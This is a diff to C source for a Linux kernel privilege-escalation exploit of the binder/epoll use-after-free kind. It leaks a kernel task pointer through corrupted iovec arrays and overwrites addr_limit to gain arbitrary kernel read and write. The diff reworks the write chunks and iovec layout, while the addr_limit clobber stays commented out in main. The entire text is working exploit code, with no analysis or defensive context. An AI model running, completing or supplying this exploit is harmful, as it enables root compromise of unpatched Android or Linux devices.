@@ -92,6 +92,8 @@ void leak_data(void* leakBuffer, int leakAmount)
   struct iovec iovec_array[IOVEC_ARRAY_SZ];
 
   memset(iovec_array, 0, sizeof(iovec_array));
+  
+  printf("dataBuffer = %lx\n", (unsigned long)dataBuffer);
 
   iovec_array[IOVEC_INDX_FOR_WQ-1].iov_base = dataBuffer; 
   iovec_array[IOVEC_INDX_FOR_WQ-1].iov_len = PAGE; 
@@ -99,7 +101,7 @@ void leak_data(void* leakBuffer, int leakAmount)
   iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0; /* spinlock: will turn to UAF_SPINLOCK */
   iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = dataBuffer; /* wq->task_list->next */
   iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = leakAmount; /* wq->task_list->prev */
-  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void*)0xDEADBEEF; // we shouldn't get to here
+  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = dataBuffer; // (void*)0xDEADBEEF; // we shouldn't get to here
   iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = UAF_SPINLOCK; 
   
   int b;
@@ -149,6 +151,13 @@ void leak_data(void* leakBuffer, int leakAmount)
   printf("PARENT: Done with leaking\n");
 }
 
+unsigned long iovec_length(struct iovec* iov) {
+    unsigned long l=0;
+    for (int i=0;i<IOVEC_ARRAY_SZ;i++)
+        l += iov[i].iov_len;
+    return l;
+}
+
 void clobber_addr_limit(void)
 {
   int dataBufferSize = MAX(UAF_SPINLOCK, PAGE)+1;
@@ -169,30 +178,41 @@ void clobber_addr_limit(void)
   
   unsigned long second_write_chunk[] = {
     (unsigned long)dataBuffer, /* iov_base (currently in use) */   // wq->task_list->next
-    2 * 0x10, /* iov_len (currently in use) */  // wq->task_list->prev
+    0x50, /* iov_len (currently in use) */  // wq->task_list->prev
+    
     current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
+    
+    current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
+    8, /* next iov_len (sizeof(addr_limit)) */
+    
+    0,
+    0,
+    
+    0xfffffffffffffffe,
+    0xfffffffffffffffe, /* value to write over addr_limit */
   };
   
   printf("size %x\n", (int)sizeof(second_write_chunk));
   
-  unsigned long third_write_chunk[] = {
-    0xfffffffffffffffe /* value to write over addr_limit */
-  };
-
+  iovec_array[IOVEC_INDX_FOR_WQ-1].iov_base = dataBuffer;
+  iovec_array[IOVEC_INDX_FOR_WQ-1].iov_len = 1;
   iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dataBuffer;
   iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0; // spinlock: will turn to UAF_SPINLOCK
   iovec_array[IOVEC_INDX_FOR_WQ+1].iov_base = dataBuffer; // wq->task_list->next: will turn to address of task_list
   iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len = sizeof(second_write_chunk); // wq->task_list->prev: will turn to address of task_list
   iovec_array[IOVEC_INDX_FOR_WQ+2].iov_base = &testDatum; // dataBuffer;
-  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len = sizeof(third_write_chunk); 
-  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_base = (void*)0xDEADBEEF;
-  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len = UAF_SPINLOCK;
-  int totalLength = iovec_array[IOVEC_INDX_FOR_WQ].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len;
+  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len = 8;
+  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_base = &testDatum; // dataBuffer;
+  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len = 8; 
+  iovec_array[IOVEC_INDX_FOR_WQ+4].iov_base = dataBuffer;
+  iovec_array[IOVEC_INDX_FOR_WQ+4].iov_len = UAF_SPINLOCK;
+  int totalLength = iovec_length(iovec_array);
  
   int socks[2];
   if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "socketpair");
 
+  write(socks[1], "x", 1);
   pid_t fork_ret = fork();
   if (fork_ret == -1) err(1, "fork");
   if (fork_ret == 0){
@@ -204,9 +224,9 @@ void clobber_addr_limit(void)
     printf("CHILD: Finished EPOLL_CTL_DEL.\n");
     
     printf("CHILD: Writing UAF dummy\n");
-    write(socks[1], dataBuffer, UAF_SPINLOCK);
+    write(socks[1], uafFill, UAF_SPINLOCK);
     write(socks[1], second_write_chunk, sizeof(second_write_chunk));
-    write(socks[1], third_write_chunk, sizeof(third_write_chunk));
+    //write(socks[1], third_write_chunk, sizeof(third_write_chunk));
     close(socks[1]);
     close(socks[0]);
     exit(0);
@@ -219,8 +239,8 @@ void clobber_addr_limit(void)
   
     sleep(1);
     printf("CHILD: Writing third chunk\n");
-    if (write(socks[1], third_write_chunk, sizeof(third_write_chunk)) != sizeof(third_write_chunk))
-      err(1, "write third chunk to socket"); 
+    //if (write(socks[1], third_write_chunk, sizeof(third_write_chunk)) != sizeof(third_write_chunk))
+    //  err(1, "write third chunk to socket"); 
   
     printf("CHILD: done\n");
     close(socks[1]);
@@ -312,8 +332,8 @@ int main(int argc, char** argv) {
   if (leakSize >= 0xe8 + 0x8) {
       memcpy(&current_ptr, leaked+0xe8, 8);
       printf("current_ptr = %lx\n", (unsigned long)current_ptr);
-//      printf("Clobbering addr_limit\n");
-//      clobber_addr_limit();
+      //printf("Clobbering addr_limit\n");
+      //clobber_addr_limit();
   }
   free(leaked);
   
